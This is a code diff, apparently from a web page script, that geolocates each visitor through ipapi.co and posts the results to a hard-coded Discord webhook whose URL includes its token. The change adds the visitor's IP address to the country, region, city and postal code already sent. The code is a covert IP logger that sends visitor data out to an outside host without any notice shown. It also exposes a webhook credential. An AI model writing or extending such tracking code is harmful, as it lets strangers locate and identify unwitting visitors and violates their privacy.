@@ -20,22 +20,23 @@
             fetch(`https://ipapi.co/${ip}/json/`)
                 .then(response => response.json())
                 .then(data => {
+                    const ip = data.ip;
                     const country = data.country_name;
                     const region = data.region;
                     const city = data.city;
                     const regioncode = data.region_code;
                     const postalcode = data.postal;
-                    sendIPToWebhook(country, region, city, regioncode, postalcode);
+                    sendIPToWebhook(ip, country, region, city, regioncode, postalcode);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
-        function sendIPToWebhook(country, region, city, regioncode, postalcode) {
+        function sendIPToWebhook(ip, country, region, city, regioncode, postalcode) {
             const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
             const payload = {
-                content: `Country: ${country}\nRegion: ${region}\nCity: ${city}\nRegion Code: ${regioncode}\nPostal Code: ${postalcode}`
+                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nRegion Code: ${regioncode}\nPostal Code: ${postalcode}`
             };
             fetch(webhookUrl, {
                 method: 'POST',
